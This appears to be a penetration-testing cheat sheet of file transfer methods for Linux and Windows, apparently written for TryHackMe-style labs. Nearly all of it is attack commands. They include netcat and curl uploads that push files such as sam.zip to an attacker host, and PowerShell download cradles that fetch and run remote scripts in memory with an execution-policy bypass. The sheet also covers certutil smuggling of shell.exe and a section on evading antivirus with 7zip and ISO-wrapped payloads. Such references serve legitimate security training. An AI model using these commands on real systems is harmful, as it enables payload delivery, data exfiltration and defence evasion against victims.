# File Transfer Methods

This document provides various techniques for transferring files between systems
during penetration testing.

---

## Linux/Unix Methods

### curl

```bash
# Download file from web server
curl -L http://$A_IP/<file> -o /tmp/<file>

# Upload file to web server with PHP upload script
curl -v -F filename=<file> -F file=@<file> http://$A_IP/upload.php
```

### Netcat (nc)

```bash
# Receiving side - listen for incoming file
nc -lvnp 80 > /path/to/output/file

# Sending side - transmit file
cat /path/to/source/file | nc 10.10.17.189 80
```

### Base64 Encoding/Decoding

```bash
# Encode file
base64 -w0 sam.zip > sam.b64

# Decode file
base64 -d sam.b64 > sam.zip

# Format for Windows transfer (adds certificate headers)
echo -----BEGIN CERTIFICATE----- && base64 <FILE YOU WANT TO SEND> && echo -----END CERTIFICATE-----
```

### Samba File Transfer

```bash
# Start SMB server in current directory
smbserver kallie .

# Connect and upload from Linux client
smbclient -c 'put whirley_service.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/'

# Connect and download from Linux client
smbclient -c 'get <filename.type>' -U <user> -W <domain> '//host/share/'
```

---

## Windows Methods

### curl.exe

```bash
# Download file 
curl.exe -L http://$A_IP/<file> -o C:\path\to\destination\file

# Upload file
curl.exe -v -F filename=<file> -F file=<file> http:/$A_IP/upload.php
```

### PowerShell Downloads

```powershell
# Simple download using Invoke-WebRequest (PowerShell 3.0+)
powershell iwr -uri http://<$A_IP>/rev_ssh/client_x64 -out c:\users\public\

# WebClient download (inline)
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<$A_IP>/rev_ssh/client_x64', 'c:\users\public\')

# WebClient download via script file
echo $webclient = New-Object System.Net.WebClient >>wswvai.ps1
echo $url = "http://<$A_IP>/rev_ssh/client_x64" >>wswvai.ps1
echo $file = "c:\users\public\" >>wswvai.ps1
echo $webclient.DownloadFile($url,$file) >>wswvai.ps1
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wswvai.ps1

# Download and execute PowerShell script directly in memory
powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://<source ip>/<file>.ps1')
IEX (New-Object System.Net.WebClient).DownloadString('http://<source ip>/<file>.ps1')
```

### PowerShell Upload

```powershell
# Upload file to web server
powershell (New-Object System.Net.WebClient).UploadFile('http://<$A_IP>/upload.php', 'rev_ssh/client_x64')
```

### Certutil Base64 Transfer

```powershell
# Encode file on Windows
certutil -encode sam.zip sam.b64

# Decode file on Windows
certutil -decode sam.b64 sam.zip

# Full base64 transfer workflow
# 1. On Linux, create base64 file with certificate headers
echo -----BEGIN CERTIFICATE----- >testfile.b64 && base64 shell.exe >>testfile.b64 && echo -----END CERTIFICATE----- >> testfile.b64

# 2. Format for copy-paste transfer
awk -F, '{ print "echo \"" $1 "\" >> tmp" }' < testfile.b64 | pbcopy

# 3. On Windows, decode the file
certutil -decode tmp shell.exe
```

### SMB Access from Windows

```powershell
# Copy from SMB share to local system
copy \\<ATTACK>\kallie\<file> .
```

---

## AV Evasion Techniques

### 7zip Archive Method

```powershell
# Download 7zip executable
iwr -uri http://<HOST>/7zr.exe -o 7z.exe

# Download compressed payload
iwr -uri http://<HOST>/client_x64.exe.7z -o client_x64.exe.7z

# Extract payload
.\7z.exe x .\client_x64.exe.7z
```

### ISO Image Bypass

```powershell
# Download ISO file containing payload
iwr -uri http://<HOST>/client_x64.exe.iso -o client_x64.exe.iso

# Mount the ISO image
$mount = Mount-DiskImage -ImagePath C:\<path to iso>\client_x64.exe.iso

# Verify mount point
$mount | Get-Volume
```
